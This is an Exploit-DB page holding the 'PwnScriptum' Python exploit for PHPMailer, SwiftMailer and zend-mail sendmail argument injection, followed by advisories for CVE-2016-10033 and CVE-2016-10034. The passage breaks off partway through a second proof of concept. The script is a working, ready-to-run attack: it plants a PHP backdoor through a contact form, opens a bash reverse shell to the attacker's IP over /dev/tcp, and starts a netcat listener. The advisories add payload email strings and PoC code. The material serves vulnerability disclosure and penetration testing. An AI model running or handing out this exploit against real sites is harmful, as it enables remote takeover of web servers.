import urllib2
import socket
import sys

# The Main Meat
print intro

# Show info
if '-H' in sys.argv:
	print info
	exit(0)
# Parse input args
parser = argparse.ArgumentParser(prog='PwnScriptum_RCE_exploit.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit (a.k.a \'PwnScriptum\')\nDiscovered by Dawid Golunski (https://legalhackers.com)')
parser.add_argument('-H', action='store_true', default="false", required=False,    help='Full Help / Info Page')
parser.add_argument('-url', dest='WEBAPP_BASE_URL', required=True,  help='WebApp Base Url')
parser.add_argument('-cf',  dest='CONTACT_SCRIPT',  required=True,  help='Contact Form scriptname')
parser.add_argument('-d' ,  dest='TARGET_UP_DIR',   required=False, help='Target Upload Dir')
parser.add_argument('-ip',  dest='ATTACKERS_IP',    required=True,  help='Attackers Public IP for RevShell')
parser.add_argument('-p',   dest='ATTACKERS_PORT',  required=False, help='Attackers Port for RevShell listener')
parser.add_argument('--version', action='version', version='%(prog)s 1.0 Limited edition')
parser.add_argument('--post-action', dest='POST_ACTION',  required=False, help='Overrides POST "action" field name',         default="send")
parser.add_argument('--post-name',   dest='POST_NAME',    required=False, help='Overrides POST "name of sender" field name', default="name")
parser.add_argument('--post-email',  dest='POST_EMAIL',   required=False, help='Overrides POST "email" field name',          default="email")
parser.add_argument('--post-msg',    dest='POST_MSG',     required=False, help='Overrides POST "message" field name',        default="msg")
args = parser.parse_args()

# Preset vars
TMOUT = 3
# Set Vars
if args.ATTACKERS_PORT is None:
	args.ATTACKERS_PORT = 8080
if args.TARGET_UP_DIR  is None:
	args.TARGET_UP_DIR = "upload"
# Build the target backdoor URL here (note the "random" pid bit to avoid php code collisions on multiple runs / multiple phpfile appends ;)
BACKDOOR_FILE = 'phpbackdoor' + str(os.getpid()) + '.php'
BACKDOOR_URL  = args.WEBAPP_BASE_URL + '/' + args.TARGET_UP_DIR + '/' + BACKDOOR_FILE
CONTACT_SCRIPT_URL = args.WEBAPP_BASE_URL + args.CONTACT_SCRIPT

# Show params
print """[+] Setting vars to: \n
WEBAPP_BASE_URL     = [%s]
CONTACT_SCRIPT      = [%s]
TARGET_UP_DIR       = [%s]
ATTACKERS_IP        = [%s]
ATTACKERS_PORT      = [%s]
CONTACT_SCRIPT_URL  = [%s]
BACKDOOR_FILEl      = [%s]
""" % (args.WEBAPP_BASE_URL, args.CONTACT_SCRIPT, args.TARGET_UP_DIR, args.ATTACKERS_IP, args.ATTACKERS_PORT, CONTACT_SCRIPT_URL, BACKDOOR_FILE)

print "[+] Choose your target / payload: "
print "\033[1;34m"
print """[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)\n"""
print """[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045)
	        The escapeshellarg() bypass :)\n"""
print """[3] SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)\n"""
print """[4] Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"""
print "\033[0m"

try:
    target = int(raw_input('[?] Select target [1-2]: '))
except ValueError:
    print "Not a valid choice. Exiting\n"
    exit(2)
if (target>4):
    print "No such target. Exiting\n"
    exit(3)
if target == 1:
	# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
	payload = '"attacker\\" -oQ/tmp/ -X%s/%s some"@email.com' % (args.TARGET_UP_DIR, BACKDOOR_FILE)
if target == 2:
	# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
	payload = "\"attacker\\' -oQ/tmp/ -X%s/%s  some\"@email.com" % (args.TARGET_UP_DIR, BACKDOOR_FILE)
if target == 3:
	# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
        payload = '"attacker\\" -oQ/tmp/ -X%s/%s "@email.com' % (args.TARGET_UP_DIR, BACKDOOR_FILE)
if target == 4:
	# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
        payload = '"attacker\\" -oQ/tmp/ -X%s/%s "@email.com' % (args.TARGET_UP_DIR, BACKDOOR_FILE)

print "\n[+] Generated mail() payload will upload the backdoor into the '%s' dir\n" % args.TARGET_UP_DIR
# PHP RCE code to be saved into the backdoor php file on the target in TARGET_UP_DIR. E.g:
# e.g:
#RCE_PHP_CODE = "<?php phpinfo(); ?>"
RCE_PHP_CODE = """<?php sleep(%d); system("/bin/bash -c 'nohup bash -i >/dev/tcp/%s/%s 0<&1 2>&1' ");  ?>""" % (TMOUT, args.ATTACKERS_IP, args.ATTACKERS_PORT)

# The form names might need to be adjusted
post_fields = {'action': "%s" % args.POST_ACTION, "%s" % args.POST_NAME: 'Jas Fasola', "%s" % args.POST_EMAIL: payload, "%s" % args.POST_MSG: RCE_PHP_CODE}

# Attack
# Inject payload into PHPMailer / mail() via a Contact form. This should write out the backdoor
print "[+] Backdoor upload via the contact form at '%s'\n" % CONTACT_SCRIPT_URL
data = urllib.urlencode(post_fields)
req = urllib2.Request(CONTACT_SCRIPT_URL, data)
response = urllib2.urlopen(req)
the_page = response.read()

# Check if the backdoor was uploaded correctly.
# A little trick here. The urlopen should timeout at sleep(X)-1 if the backdoor ran fine
# So we catch the timeout to find out.

# Is it uploaded ? Try to execute the PHP backdoor and the Reverse Shell within it
print "[+] Checking for the backdoor at the URL '%s'\n" % BACKDOOR_URL
got_timeout = 0
http_err = 0
try:
    urllib2.urlopen(BACKDOOR_URL, timeout = (TMOUT-1))
except urllib2.HTTPError as e:
    http_err = e.code
except socket.timeout as e:
    print "[*] \033[1;32mLooking good!\033[0m The sleep() worked by the looks of it :) \nUrlopen timed out just in time for the shell :)\n"
    got_timeout = 1

if (got_timeout != 1):
    print "[!] Something went wrong... Got error: [%d] \nTry another dir? Push through, don't give up! :)\n" % http_err
    exit(2)

# Spawn the shell and wait for the sleep() PHP call to finish before /bin/bash is called
print "[+] We should get a shell if we got till here! Spawning netcat now! :)\n"
print "[+] \033[1;34mPlease tell me you're seeing this too... ;)\033[0m\n"
os.system("nc -v -l -p %d" % args.ATTACKERS_PORT)

print "\n[+] Shell closed\n"

print "\033[1;34mP.$. There's more to it :) Exiting, for now...\033[0m\n"

```

**Tags:**

**Advisory/Source:**
[Link](https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

¬©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

√ó

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as ‚ÄúGoogle Hacking‚Äù was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny‚Äôs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term ‚ÄúGoogledork‚Äù to refer
to ‚Äúa foolish or inept person as revealed by Google‚Äú. This was meant to draw attention to
the fact that this was not a ‚ÄúGoogle problem‚Äù but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term ‚Äúdork‚Äù became shorthand for a search query that located sensitive
information and ‚Äúdorks‚Äù were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

√ó

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

√ó

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from legalhackers.com_f5a1de07_20250126_083820.html ===

```

[__                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/](https://legalhackers.com)

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Interested in security / vulns / exploits ?
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)

[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-10033
- Release date: 25.12.2016
- Last revision: 28.12.2016
- Revision 4.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

PHPMailer < 5.2.18 Remote Code Execution

II. BACKGROUND
-------------------------

"PHPMailer continues to be the world's most popular transport class, with an
estimated 9 million users worldwide. Downloads continue at a significant
pace daily."

<http://phpmailer.worxware.com/>

"Probably the world's most popular code for sending email from PHP!
Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, [..],
Joomla! and many more"

<https://github.com/PHPMailer/PHPMailer>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in PHPMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the PHPMailer class.

Note: This revision (4.0) of the advisory, contains more information but
is still incomplete.
Remaining attack vectors/exploits will be disclosed at a later date to allow
more time for patching.

IV. DESCRIPTION
-------------------------

PHPMailer class uses PHP mail() function as its default transport.

The transport is implemented using the function:

    protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        $params = null;
        //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver
        if (!empty($this->Sender)) {
            $params = sprintf('-f%s', $this->Sender);
        }
        if ($this->Sender != '' and !ini_get('safe_mode')) {
            $old_from = ini_get('sendmail_from');
            ini_set('sendmail_from', $this->Sender);
        }
        $result = false;
        if ($this->SingleTo and count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);

which essentially passes the arguments shown in the line:

$result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);

to the mail() function with the same set of parameters.

The parameters include the 5th parameter of $params which allows to pass extra
parameters to sendmail binary installed on the system as per PHP documentation
of mail() function:

<http://php.net/manual/en/function.mail.php>

As can we see from:

$params = sprintf('-f%s', $this->Sender);

PHPMailer uses the Sender variable to build the params string.

The Sender string is normally set with the use of setFrom() method.
which validates the Sender's address:

public function setFrom($address, $name = '', $auto = true)
{
$address = trim($address);
$name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
// Don't validate now addresses with IDN. Will be done in send().
if (($pos = strrpos($address, '@')) === false or
    (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and
    !$this->validateAddress($address)) {
...

The validation would for example reject an address as:

attacker -InjectedParam2 @attacker.com

which would prevent injection of additional parameters to Sendmail via the
mail() function.

Further research however shown that the validation is done using the RFC 3696 specification.

The RFC allows emails to contain spaces when quoted with ".
According to the spec, the following email address is valid:

" some test email address with spaces"@weird-email.com

The following Sender address:

"Attacker -Param2 -Param3"@test.com

would cause PHPMailer/mail() function to execute /usr/bin/sendmail with the
following list of arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker -Param2 -Param3@test.com]

which would not work for the attacker (Param2 and Param3 are passed within
the same argument of argv[3] )

Attackers can however break out of parameter no.3 with some extra escaping.

For example, by injecting an extra sequence of \" after the first argument,
the following Sender email:

"Attacker \" -Param2 -Param3"@test.com

when passed to PHPMailer (and eventually to mail()) function would cause
sendmail to execute with:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Which as can be seen would inject additional parameters of 4 & 5 to sendmail.

Attackers can exploit this to achieve code execution as shown in the PoC
below.

V. PROOF OF CONCEPT EXPLOIT
-------------------------

<?php

/*

PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)

Discovered/Coded by:

Dawid Golunski (@dawid_golunski)
<https://legalhackers.com>

Full Advisory URL:
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fattacker\]
Arg no. 4 == [-oQ/tmp/]
Arg no. 5 == [-X/var/www/cache/phpcode.php]
Arg no. 6 == [some"@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
The resulting file will contain the payload passed in the body of the msg:

09607 <<< --b1_cb4566aa51be9f090d9419163e492306
09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?>
09607 <<<
09607 <<<
09607 <<<
09607 <<< --b1_cb4566aa51be9f090d9419163e492306--

See the full advisory URL for details.

*/

// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
// For example from a Contact form

$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php  some"@email.com';
$msg_body  = "<?php phpinfo(); ?>";

// ------------------

// mail() param injection via the vulnerability in PHPMailer

require_once('class.phpmailer.php');
$mail = new PHPMailer(); // defaults to using php "mail()"

$mail->SetFrom($email_from, 'Client Name');

$address = "customer_feedback@company-X.com";
$mail->AddAddress($address, "Some User");

$mail->Subject    = "PHPMailer PoC Exploit CVE-2016-10033";
$mail->MsgHTML($msg_body);

if(!$mail->Send()) {
  echo "Mailer Error: " . $mail->ErrorInfo;
} else {
  echo "Message sent!\n";
}

?>

~~~~~~~~~~~

More advanced exploit targetting a contact form can be found at:

<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

The researcher also developed an Unauthenticated RCE exploit for a popular
open-source application (deployed on the Internet on more than a million servers)
as a PoC for real-world exploitation. It might be published after the vendor has
fixed the vulnerabilities.

Video PoC:
~~~~~~~~~~~~~

<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

VI. BUSINESS IMPACT
-------------------------

A successful exploitation could let remote attackers to gain access to
the target server in the context of the web server account which could
lead to a full compromise of the web application.

VII. SYSTEMS AFFECTED
-------------------------

All versions of PHPMailer before the critical release of 5.2.18 are affected.

Note that exploitation is not limited to systems with Sendmail MTA.

VIII. SOLUTION
-------------------------

UPDATE: The author of this advisory published a bypass of the current
solution/fix which makes the PHPMailer vulnerable again in versions <5.2.20

Details:
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>

~~~~~

The vulnerability was responsibly disclosed to PHPMailer vendor.
The vendor released a critical security release of PHPMailer 5.2.18 to fix the
issue as notified at:

<https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md>

<https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md>

CVE MITRE assigned the following ID to this vulnerability:

CVE-2016-10033

Users should urgently update to the patched release.

IX. REFERENCES
-------------------------

<https://legalhackers.com>

Bypass of the CVE-2016-10033 fix which was assigned CVE-2016-10045 id:
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>

This (CVE-2016-10033) advisory:
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

WordPress Core 4.6 - RCE Remote Code Execution PoC Exploit:
<https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html>
<https://www.youtube.com/watch?v=ZFt_S5pQPX0>

Video PoC exploit:
<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>
<https://www.youtube.com/watch?v=xyYMYvT2bx8>

Exploit code:
Simple PoC shown above is available here:
<https://legalhackers.com/exploits/CVE-2016-10033/PHPMailer-RCE-exploit-poc.txt>

Combined exploit code for multiple targets:
<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Other exploits with other attack vectors will be disclosed at a later date to
allow more time for patching.

The previously undisclosed techniques and exploitation vectors will be described in a security
white-paper at:
<https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html>

CVE-2016-10033
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033>

PHPMailer / Vendor security updates / notices:

<https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md>

<https://github.com/PHPMailer/PHPMailer>

<https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md>

After the release of the first advisory, the vulnerability was dubbed with a name "PwnScriptum"
on a dedicted website that summerizes available information at:
<http://PwnScriptum.com>

X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>

XI. REVISION HISTORY
-------------------------

28.12.2016 - Rev 4.0: Removed 'Yii' from the introduction quote that was
taken from PHPMailer github. Yii is bundled with SwiftMailer, not with PHPMailer.
See CVE-2016-10074 for SwiftMailer vulnerability.

27.12.2016 - Rev 3.0: Updated the advisory with a link to the advisory about CVE-2016-10045

27.12.2016 - Rev 2.0: Disclosure of additional information + Simple PoC

25.12.2016 - Limited advisory released to prompt an urgent update by
affected users before disclosing the details.

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Check out the new project of the same author:
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)
[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

```


=== Content from legalhackers.com_930d1f32_20250126_083757.html ===

```

[__                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/](https://legalhackers.com)

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Interested in security / vulns / exploits ?
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)

[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-10034
- Release date:  30.12.2016
- Last revision: 30.12.2016
- Revision 1.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

Zend Framework < 2.4.11    Remote Code Execution (CVE-2016-10034)
zend-mail < 2.4.11
zend-mail < 2.7.2

II. BACKGROUND
-------------------------

"Zend Framework is a collection of professional PHP packages with more than 95
million installations. It can be used to develop web applications and
services using PHP 5.6+, and provides 100% object-oriented code using a broad
spectrum of language features.

Zend Framework 3 evolved from both Zend Framework 2 and 1; cumulatively,
the previous versions were downloaded more than 15 million times.

The principal sponsor of Zend Framework is Zend, a Rogue Wave Company, but
many others have contributed components or significant features to the
framework. Companies such as Google, Microsoft, and StrikeIron have
partnered with Zend to provide interfaces to web services and other
technologies they wish to make available to ZF developers."

<https://framework.zend.com/about>

<https://github.com/zendframework/zendframework>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in zend-mail, a
Zend Framework's component that could potentially be used by (unauthenticated)
remote attackers to achieve remote arbitrary code execution in the context
of the web server user and remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the zend-mail class.

Note: This advisory is limited.
Remaining attack vectors/exploits will be disclosed at a later date to allow
more time for patching.

IV. DESCRIPTION
-------------------------

zend-mail component of Zend Framework, suffers from the same vulnerability as
the ones disclosed in PHPMailer and SwiftMailer:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

If a web application based on Zend Framework passes an untrusted input to
setFrom() function of the zend-mail's Sendmail transport, an attacker could
inject additional parameters to Sendmail program.

By injecting an extra sequence of \" after the first argument, the following email:

"Attacker \" -Param2 -Param3"@test.com

when passed to zend-mail's Sendmail transport (and eventually to mail()) function
would cause sendmail to execute with:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Which as can be seen would inject additional parameters of 4 & 5 to sendmail.

Attackers can exploit this to achieve code execution as shown in the PoC
below.

V. PROOF OF CONCEPT EXPLOIT
-------------------------

<?php

/*

Zend Framework < 2.4.11    Remote Code Execution (CVE-2016-10034)
zend-mail < 2.4.11
zend-mail < 2.7.2

Discovered/Coded by:

Dawid Golunski
<https://legalhackers.com>

Full Advisory URL:
<http://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html>

Video PoC
<https://legalhackers.com/videos/ZendFramework-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10034-PoC.html>

Follow the feed for updates:

<https://twitter.com/dawid_golunski>

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-r]
Arg no. 4 == [attacker\]
Arg no. 5 == [-oQ/tmp/]
Arg no. 6 == [-X/var/www/cache/phpcode.php]
